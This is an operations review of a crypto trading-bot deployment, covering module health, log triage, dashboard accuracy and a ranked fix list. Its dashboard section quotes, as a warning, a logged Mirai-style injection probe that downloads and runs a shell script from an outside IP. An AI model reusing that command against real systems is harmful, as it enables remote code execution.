# Wave-F6 Ops Sweep — Orchestrator, Intel/Ops Modules, Dashboard, stderr Triage

Read-only analysis, 2026-07-10. Log window analyzed: **2026-07-07 08:18 → 2026-07-09 ~20:41 UTC**
(single continuous run; the entire window is post-Wave-F5). Prior report:
`docs/agents/wave-f5/07_intel_ops.md`. Screenshot analyzed:
`screenshots/screencapture-38-242-251-156-8080-control-center-2026-07-09-23_57_25.png`
(the clmm_lp screenshot mentioned in the task brief is **not present** in `screenshots/`).

---

## 1. Orchestrator verdict: CLEAN — best window on record

Evidence from `logs/orchestrator.log` (2.6MB, single start banner at line 2):

- **One start, zero restarts.** Exactly one `🚀 Trading Bot Orchestrator Starting`
  (2026-07-07 08:18:44). All 28 subprocesses show `Restarts: 0` on **every one of 18,536**
  status lines through 2026-07-09 20:38. Grep for
  `restart|died|exit|crash|permanent|latch|killed|OOM` (excluding `Restarts: 0`) returns
  **zero lines**. No ERROR/WARN lines at all.
- **Permanent-failure latch: not triggered, fix verified wired.** The RC-D1 repair is present
  and armed — `asyncio.create_task(self._restart_flag_monitor())` at `main.py:911`, budget
  reset at `main.py:477`, and the "restart budget exhausted; touch logs/.restart_<module>"
  operator hint at `main.py:845`. It could not be *exercised* because nothing crashed:
  zero module deaths in ~60.5h. No `logs/.restart_*`, `logs/.pause_*`, or `logs/.killswitch`
  flag files exist.
- **No OOM signatures.** No SIGKILL/exit-137/OOM text anywhere in the orchestrator log or
  any stderr file.
- **mem_limit 6g: flat but TIGHT.** Per-module RSS is stable across the window (DEX
  1335→1360MB over 60h — ~0.4MB/h drift; Dashboard pinned at 791MB; Advisor oscillating
  1004-1034MB). However the **sum of last-snapshot RSS ≈ 6.1GB** (DEX 1361 + Advisor 1025 +
  Dashboard 791 + Futures 348 + Sniper 261 + Solana 245 + Arb 219 + Copy 204 + AI 190 +
  ~1.5GB across the 19 intel/ops processes). Shared CoW pages mean real container usage is
  below the naive sum, but there is little headroom — any new heavyweight module or a DEX/
  Advisor leak resumes the OOM risk. **Watch item, not a defect.**

---

## 2. Per-module status table

Legend: WORKING = doing its designed job; DEGRADED = alive but output impaired;
BROKEN = designed output not being produced. All timestamps UTC.

### Trading modules (context for ops findings)

| Module | Status | Evidence |
|---|---|---|
| DEX | WORKING (DRY) | Continuous scans; flat memory; errors log only RugCheck 400s on `...pump` mints (upstream "unable to generate report", fail-safe path) |
| FUTURES | WORKING (DRY) | Trading, consecutive-loss circuit breaker + FUT-RM-17 cool-offs firing as designed (`stderr.log.1`) |
| SOLANA | WORKING (DRY), Drift sub-feature BROKEN | Trades flowing. Drift: (a) client init crashes `KeyError: 'mainnet-beta'` at `modules/solana_strategies/drift_helper.py:194-197` (driftpy configs key is `mainnet`); (b) every Drift signal blocked `⛔ Drift SOL-PERP blocked by RiskManager: Insufficient liquidity` — **3,430 warnings per market** (SOL/ETH/BTC-PERP) because token-style liquidity validation runs against a perp market name (`modules/solana_trading/core/solana_engine.py:3806`). Feature dead + ~10k log-spam lines |
| SNIPER | DEGRADED — detection healthy, **0 entries for the whole window** | Listener self-heal WORKS (WSS + polling pools flowing, RPC rotation on 429). But every 1-min stats line reads `Passed: 0 (0.0%)` with **100% of analyzed candidates bucketed LowBSR** (e.g. `Analyzed: 14 | Passed: 0 | LowBSR: 14`). See §5 finding S-1 |
| ARBITRAGE | WORKING (DRY) as instrumented, **PnL on dashboard is phantom** | Honest hourly spread line present: `SPREAD DISTRIBUTION (last hour, 287 samples): median -97.6bps | best -69.0bps` — confirms the F5 AMBER/SHADOW verdict (no executable edge). BUT the triangular engine books paper fills: repeated `✅ Triangular Arb Executed (DRY RUN): CRV_WETH_USDC ... Profit: $31.79` on the *same* CRV triangle at an almost constant 1.788% "spread" every ~2min (stale V2 pricing). These rows are the dashboard's "+1085 USD 7D / 100% win / Sharpe 3.00". See §6 |
| COPY_TRADING | DEGRADED | Alive (20 cycles/5min, 4 wallets) but **0 copies executed all window** (`EVM Copies: 0 | Solana Copies: 0` every stats line); Helius saturation (§5 C-1); `DEAD LEADERS 3/4` warned 11× |
| AI | WORKING (budget-bounded) | 86/242 cycles used Anthropic; 156 cycles ran `provider=none` after the daily `ai=40` LLM reservation is spent (`logs/.llm_budget.json`: `count: 150/150` with ai 40, advisor 60, kap 50 — budget fully consumed daily). Working as designed, but ~64% of cycles are LLM-less |
| POLYMARKET | WORKING (shadow) | Momentum signals recording; one Gamma timeout (fail-soft). Dashboard "AVG EDGE 2950.0 bps" tile is from a single (likely pre-F5 historical) arb signal — see §6 |
| ADVISOR | DEGRADED | KAP/BIST cycles fine, but **1,650 `[kronos] Inference error: klines missing OHLC columns; have ['close']`** warnings — the Kronos forecaster receives close-only frames and never produces output. Plus Telegram 429/502 (49+34, retried) |

### Intel/ops modules

| Module | Status | Evidence |
|---|---|---|
| TREASURY | DEGRADED — **still 0 snapshots** | F5 fix ENGAGED: `Secrets manager initialized` + the new one-shot WARNINGs fire (`PRIVATE_KEY not resolvable via secrets manager`, same for both `SOLANA*_PRIVATE_KEY`s, 08:18:53). But all three PK derivations fail **and** env fallbacks (`WALLET_ADDRESS`/`SOLANA_WALLET`/`SOLANA_MODULE_WALLET`) are unset in the deployment → `no wallet addresses discovered — idle tick` every 5min, `observed=0/0`. The failure class is now VISIBLE (the F5 goal) — remaining work is **operator config**, not code |
| YIELD_TREASURY | DEGRADED (cascade) | `no fresh idle data (treasury module snapshots required) — idle tick`; self-heals the moment treasury writes its first snapshot |
| INTENT_SOLVER | WORKING as designed (parked) | 403 storm FIXED: mig 143 confirmed — exactly **one** CoW 403/hour (~60 total vs 28k pre-F5), with the `3 consecutive HTTP 403s ... backing off to hourly` breaker line. 7.5KB log for 2.5 days |
| PARAM_TUNER | WORKING, no proposals yet | Mig 143 retarget confirmed: `tunables=5` (3 original + futures `atr_tp_rr_ratio` + solana `jupiter_auto_exit`), and rewards now flow (`rewarded=1-2` on ~⅓ of hourly ticks vs once-in-20-days pre-F5). `proposed=0` across the window → **no variant challenges opened yet**; plausible given 6h reward windows (~10 rewards/tunable max so far), re-check after 2 weeks |
| BASIS_DESK | WORKING | F5 venue summaries PRESENT every 5-min tick: `venues={'bybit': 'ok:6', 'binance': 'ok:6'} quotes=12 actionable=0 rejects={breakeven ...}` — honest costing rejects everything (best ≈ -35bps net), as expected |
| SENTINEL | WORKING — and it caught a real one | Ticks every 60s. **`ANOMALY full_rejection/sniper` fired 2,099 times** (1 CRITICAL 07-07 16:32 + 2,098 WARN): "sniper rejected 100% of 113 candidates since process start — a gate is likely mis-set". This is the strongest cross-module signal in the window and it is correct (§5 S-1). Autopilot correctly OFF (`actions=0 autopilot=False`) |
| META_CONTROLLER | WORKING (advisory) | 15-min ticks, `scored=7 actuated=0 autopilot=False`. Note: self-calibration reads 0-33% (`0/3 prior decisions matched forward PnL`) — decisions are low-signal so far. It says "sniper: KEEP — insufficient data" while sentinel screams full_rejection: the two advisory layers don't share findings (design gap, not a bug) |
| REGIME_ALLOCATOR | WORKING | Hourly regime classification (NEUTRAL→RANGE_COMPRESSION conf 0.71), `proposals=7` per tick |
| ORCHESTRATOR_AI | WORKING | Hourly recs for 7 modules, `recommendations_inserted=7, errors=[]`. Currently recommends `solana -> to_live (conf=1.00)` on 269 DRY trades / 68% win — operator inbox item, not auto-acted |
| PORTFOLIO_ALLOCATOR | WORKING | Hourly `proposals_written=7, reserve=21.42%, errors=[]` |
| EXECUTION_QUALITY | WORKING | 30-min TCA ticks, `new_rows=5-10, bad_rows=0` per tick (~19.6k total rows per the control-center) |
| MARKET_DATA_WAREHOUSE | WORKING | 5-min ingest, `candles≈54-59 series=3 errors=0` (221k rows total) |
| CATALYST_CALENDAR | DEGRADED | Only `static_macro: 1` ever collected. `defillama_unlocks` dead: `https://api.llama.fi/emissions -> HTTP 402` (endpoint went paid; correctly suppressed after one warn). `binance_announcements: 0` every tick all window — silently yields nothing, needs a look |
| OPTIONS_VOL | WORKING (data), 0 suggestions | Deribit BTC/ETH chains polled fine (ivrv ≈ 0.74-0.77 — IV *cheap* vs RV all window, so no vol-selling-style alerts is plausible); `options_vol_suggestions` total rows = 0. Not wrong, but 2.5 days × 0 output means the suggestion thresholds have never been provably exercisable — worth a synthetic test |
| EXECUTION_GATEWAY | WORKING (idle library) | Diagnostics process up, hourly pool_engine health checks (96 endpoints, 81-82 healthy). No module wired to it — expected |
| CLMM_LP | WORKING (shadow) | Proposals + max-age closes flowing (`net_apr=116.3%` proposals; `[close:max_age] id=16 ... net=$3.76`). Minor: every engine line is **logged twice** (duplicate handler) — same in stat_arb |
| STAT_ARB | WORKING (shadow) | Entries/exits simulated correctly (`[exit:mean_revert] AVAX~DOT z=1.52 pnl=$4.36 sim=True skip=shadow_mode`), 79 rows |
| SMART_MONEY | DEGRADED (1 of 3 chains) | Base ingesting fine (27-43 swaps/tick, 577 wallets scored). **Ethereum ingests 0 swaps** — F5's hourly WARN is firing exactly as designed (59×): `eth_getLogs error ... free-tier RPCs reject ... Operator action: point ethereum at a getLogs-capable endpoint (Alchemy/dRPC)`. Arbitrum: pairs discovered (3) but 0 swaps — likely the same getLogs limitation but it does **not** warn for arbitrum (only ethereum warns), so it's silent. `signals=0` overall |

---

## 3. stderr triage (first-ever pass over every module's stderr)

Structural note: for most modules `stderr.log` is a byte-identical mirror of the module log
(same size), so unique findings concentrate in the big rotated files. **Tracebacks across all
28 stderr files: exactly 2** (dashboard scanner noise + solana Drift init, both below).
No native crashes, no asyncio "Task was destroyed" / "coroutine never awaited" warnings found.

| File | Finding |
|---|---|
| `copy_trading/stderr.log` (9.1MB) | **~50,600 Helius rate-limit warnings**: `All HELIUS_API endpoints rate-limited; using least-penalized '<key>'` ≈ 9.1-9.4k per key × 5 keys + 13.6k generic `Rate limited`. Corroborated by pool_engine: `pool_engine_rate_limits.log` shows per-key `count=27,7xx` (a 429 every ~8s per key, 18.1k events in the current rotation alone, 3×5MB rotations filled). The F5 multi-key rotation works mechanically but **demand from copy+sniper+solana far exceeds 5 free-tier keys** — this is why copy discovery/copies produce 0 |
| `sniper/stderr.log.1` (24MB) | 851 `Rate limited` + 848 backoffs, 20 WSS disconnects, 58 `No pools detected` windows — all recovered by the F5 supervisor/rotation. WSS rejection counters dominated by `NoResult: 494k` + `TxFailed: 106k` (getTransaction commitment misses under rate-limiting), i.e. the same Helius saturation |
| `solana_trading/stderr.log.1` (50MB) | The 1 real traceback: **Drift `KeyError: 'mainnet-beta'`** (`drift_helper.py:194`). Then 3,430×3 `⛔ Drift *-PERP blocked by RiskManager: Insufficient liquidity` spam (§2). Also 29 `RAPID CRASH DETECTED → EMERGENCY EXIT` events — protective path firing correctly in DRY |
| `futures_trading/stderr.log.1` (13MB) | Clean: consecutive-loss breaker + per-symbol cool-offs only. No tracebacks |
| `dashboard/stderr.log` (5.7MB) | 1 traceback: `InvalidURLError` from a malformed scanner request (`GET default.asp`) — harmless parser rejection, but see §4 exposure finding |
| `arbitrage/stderr.log` (1.6MB) | 522 `STALE DATA`, 441 `SLOW-SCAN MODE`, ~530 hourly liquidity blacklists (USDC/DAI/USDT etc. "no liquidity" — thin V2 pools, consistent with the negative spread reality). No 401/403 poisoning (F5 fix holding) |
| `advisor/stderr.log` | 1,650 kronos inference errors (§2), 3 LLM-budget denials for kap (cap working) |
| `dex_trading/stderr.log` (720KB) | Only sklearn `RobustScaler ... fitted with feature names` UserWarnings (print-based, cosmetic; suppressible at the predict call site) |
| All 16 intel/ops stderr files | Mirrors of module logs; nothing unique |

---

## 4. Dashboard

- **Zero HTTP 500s in the whole window** (access-log grep over 5.7MB). `/modules` 200,
  `/proposals` and `/polymarket/*` were **never requested**, so the new pages are unexercised —
  not proven broken, not proven working.
- **Session 401s: not gone.** 1,247 401s from a single IP (5.27.44.206, evidently the
  operator) concentrated 07-09 18:00→20:40+, on `/api/bot/status`, `/api/dashboard/summary`,
  `/api/modules`, `/api/control-center/overview`, etc., plus one
  `WS connect rejected (no session_id)` at 18:07. Pattern = an open control-center tab whose
  session expired kept polling for 2.5+ hours; **the frontend does not redirect to `/login`
  on 401**, it just silently spins. UX fix, not auth regression (173 successful `/login` 200s;
  no operator 403s).
- **The dashboard is internet-exposed and being actively attacked.** Access log records a
  Mirai-style RCE probe:
  `GET /login.cgi?cli=...wget http://91.92.40.118/wget.sh...chmod 777 .s;sh .s...` (302'd,
  not executed), `GET /api/.env` / `/api/.env.production` fishing (401'd), bot login POSTs
  (403'd), and path-scanner sweeps from ≥5 IPs (172.235.181.217, 45.148.10.200, 69.5.169.x…).
  Auth held every time, but a trading bot's control plane on a public 8080 with password auth
  is one credential leak away from `/api/bot/emergency-exit` or worse. Recommend firewalling
  8080 to operator IPs / VPN or at minimum fail2ban-style lockout.
- `dashboard.log` internal errors: near-zero (one `Could not load full config: 'ConfigManager'
  object has no attribute ...` WARNING, one futures health-probe timeout).

---

## 5. Root-caused defects found this sweep

**S-1. Sniper LowBSR full rejection (BROKEN entry path; sentinel confirmed 2,099×).**
100% of analyzed candidates all window die in the buy/sell-ratio gate
(`modules/sniper/core/sniper_engine.py:1110-1136`). Two compounding causes:
(a) `_get_buy_sell_ratio` (`sniper_engine.py:1346-1384`) depends on Birdeye
`public-api.birdeye.so/defi/txs/token`; any non-200 / missing key / 429 returns `None`,
and with `sniper_fail_closed_missing_bsr=True` (`sniper_engine.py:233`) + the mig-140B age
floor, `None` → reject. Under the observed Helius/Birdeye saturation, virtually every fresh
mint yields `None`. (b) The stats bucket conflates "BSR missing (fail-closed)" with
"BSR genuinely < 2.0" under one `LowBSR` counter, hiding which is happening.
Fix: split the counters (`missing_bsr_rejected` vs `low_bsr_rejected`) and either provision a
real Birdeye key with headroom or add a Helius-DAS/RPC-derived BSR fallback; reconsider
`sniper_min_buy_sell_ratio=2.0` only after data source works.

**S-2. Drift dead + spam.** `drift_helper.py:194-197` passes `"mainnet-beta"` to
`DriftClient`; driftpy's configs dict keys it as `mainnet` → `KeyError`, Drift never connects.
Independently, `solana_engine.py:3806` blocks every Drift signal via token-style
`RiskManager.validate_trade("SOL-PERP", ...)` ("Insufficient liquidity" — a perp market has no
DEX pool), producing 10k+ WARN lines. Fix both, or gate the Drift signal generator off while
the feature is broken.

**S-3. Helius capacity.** 5 keys × free tier is saturated 24/7 (27.7k rate-limit events per
key). Copy trading cannot copy, sniper getTransaction misses ~half a million WSS events.
Either add paid Helius or shed load (sniper `SNIPER_WSS_CONCURRENCY`, copy poll cadence).

**S-4. Treasury wallet config (operator).** Code path fixed and loud; deployment lacks both
resolvable PKs in secrets and the env fallback addresses. Set `WALLET_ADDRESS` /
`SOLANA_WALLET` / `SOLANA_MODULE_WALLET` (observe-only, public addresses) or load keys into
secrets — this also un-idles yield_treasury.

**S-5. Advisor Kronos feeder.** `advisor/kronos_forecaster` is called with close-only klines
1,650×: the upstream frame builder drops OHLC columns. Kronos has produced nothing all window.

---

## 6. Screenshot vs log reality (control-center, 2026-07-09 23:57)

| Screenshot claim | Log reality | Verdict |
|---|---|---|
| Sniper badge **OFFLINE** | Process RUNNING with 0 restarts (orchestrator 20:38); pools flowing at 20:40. Liveness = `sniper_runtime_stats` freshness ≤ **120s** (`monitoring/enhanced_dashboard.py:2846`), but the engine persists stats only inside the 1-min stats logger, whose observed cadence stretches to **121-150s** under rate-limit backoffs (stats lines 20:33:07 → 20:35:37 → 20:37:38). Intermittent **false OFFLINE**. Fix: bump max-age to ~300s or persist on a dedicated timer | FALSE badge (likely) |
| Copy Trading badge **OFFLINE** | Process alive (stats every 5min through 20:38). Liveness = "a `copytrading_trades` row in the last **2h**" (`enhanced_dashboard.py:2871-2875`) — but copy has executed **0 copies all window**, so an idle-but-healthy module *always* reads OFFLINE. Fix: give copy a runtime-stats heartbeat row like sniper's | FALSE badge (structural) |
| Arbitrage: 7D **+1085 USD, 100% win, Sharpe 3.00** | Entirely triangular **DRY-RUN paper fills** on one CRV/WETH/USDC V2 triangle whose "1.788% spread" repeats identically for hours (stale pricing); the same engine's honest spatial measurement says median **-97.6bps** net. The triangular path has no atomic receiver and is explicitly scope-cut — these numbers are unachievable | MISLEADING PnL; consider excluding triangular sim rows from control-center PnL or badging them |
| Polymarket **AVG EDGE 2950.0 bps** | One recorded arb signal total; current logs show only momentum signals. A 29.5% "edge" wildly exceeds the mig-137 too-good-to-be-true cap — almost certainly a pre-F5 historical row polluting the average. Verify `polymarket_signals` and filter pre-F5 rows from the tile | STALE datum |
| Meta decisions: "sniper KEEP — insufficient data" | Sentinel has 2,099 full_rejection anomalies on sniper in the same DB | Consistency gap between advisory layers |
| Intel/ops grid: all DRY RUN, Treasury/Options Vol/Yield/Basis/Intent/Smart Money **0 rows 24h** | Matches logs exactly (treasury idle, options no suggestions, basis actionable=0, smart_money signals=0) | HONEST — F5 `_aux_runtime_spec` restore works |
| "Bot Running", 28 modules, PnL tiles | Matches orchestrator + module logs | Accurate |

---

## 7. Ranked fix list

| # | Sev | Fix | Where |
|---|---|---|---|
| 1 | P0 | Sniper BSR gate: split missing-vs-low counters; fix/provision the Birdeye BSR source or add fallback — sniper has produced 0 entries for 2.5 days and sentinel has flagged it 2,099× | `modules/sniper/core/sniper_engine.py:1110-1136`, `:1346-1384`, `:233` |
| 2 | P0 (security) | Restrict public exposure of dashboard :8080 (VPN/IP allowlist + login rate-limit); RCE probes and `.env` fishing are live in the access log | deploy config (`docker-compose`), `monitoring/enhanced_dashboard.py` login handler |
| 3 | P1 | Helius capacity: paid key or load-shedding for copy/sniper/solana (27.7k 429s per key; copy copies = 0) | operator + `docs/RPC_API_KEYS_GUIDE.md` knobs |
| 4 | P1 | Treasury wallets: set env fallback addresses or load PKs into secrets (unblocks yield_treasury too) — code is fixed and loud | operator `.env` / secrets |
| 5 | P1 | Exclude/badge triangular DRY paper fills in control-center PnL (they read +1085 USD @ 100% win vs measured -97.6bps reality) | `monitoring/enhanced_dashboard.py` cross-module PnL query; or gate `TriangularArbitrageEngine` sim booking |
| 6 | P1 | Drift: `"mainnet-beta"` → `"mainnet"`; replace token-style `validate_trade("SOL-PERP")` with perp-appropriate risk gate; stop the 10k-line WARN spam | `modules/solana_strategies/drift_helper.py:194-197`, `modules/solana_trading/core/solana_engine.py:3806` |
| 7 | P2 | False OFFLINE badges: sniper heartbeat max-age 120→300s (or timer-driven persist); copy_trading needs a real heartbeat instead of trades-recency | `monitoring/enhanced_dashboard.py:2846`, `:2864-2878`; `modules/sniper/core/sniper_engine.py:1417` |
| 8 | P2 | Frontend: redirect to `/login` on API 401 instead of silently polling forever (1,247 401s in one evening) | dashboard JS polling helpers |
| 9 | P2 | Advisor Kronos: pass full OHLC frames (1,650 inference errors, zero output) | `advisor/kronos_forecaster` caller/frame builder |
| 10 | P3 | Catalyst: DefiLlama `/emissions` is HTTP 402 (paywalled) — find alternate unlock source; investigate binance_announcements permanent 0 | `modules/catalyst_calendar/` collectors |
| 11 | P3 | Smart_money: extend the hourly getLogs WARN to arbitrum (silent 0-swap chain); operator should point ethereum at a getLogs-capable RPC | `modules/smart_money/` ingest; `/settings/rpc-api` |
| 12 | P3 | Duplicate log lines in clmm_lp + stat_arb engines (double handler); polymarket avg-edge tile should exclude pre-F5 signals | `modules/clmm_lp/`, `modules/stat_arb/` logger setup; control-center polymarket query |
| 13 | P3 | Memory: total RSS ≈ 6.1GB vs 6g mem_limit — audit DEX (1.36GB) and Advisor (1.03GB) footprints before adding modules | `docker-compose` / module review |

### Wave-F5 fix scorecard (this window)
Engaged & verified: orchestrator restart-flag machinery (armed, unneeded), intent_solver
hourly backoff, basis_desk venue summaries, param_tuner retarget (rewards flowing),
treasury loud secrets warnings, sniper listener self-heal, smart_money hourly getLogs WARN,
arbitrage 401/403 quarantine + honest SPREAD DISTRIBUTION, `_aux_runtime_spec` (intel/ops
panels honest), LLM budget caps. Not yet achieving intent: treasury snapshots (config),
copy discovery→copies (Helius capacity), sniper entries (BSR gate), session-expiry UX.
